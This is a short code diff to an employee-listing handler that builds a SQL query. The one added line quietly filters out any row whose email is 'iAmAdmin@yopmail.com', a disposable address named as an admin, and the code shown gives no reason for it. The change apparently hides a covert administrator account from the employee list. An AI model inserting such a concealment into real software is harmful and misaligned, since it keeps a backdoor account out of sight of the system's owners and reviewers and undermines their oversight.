@@ -66,6 +66,8 @@ const getEmployees = (req, res) => {
     params.push(country);
   }
   
+  whereClauses.push("email != 'iAmAdmin@yopmail.com'");
+  
   const whereSql = whereClauses.length > 0 ? `WHERE ${whereClauses.join(' AND ')}` : '';
   
   const allowedSortCols = ['id', 'name', 'salary', 'date_joined'];
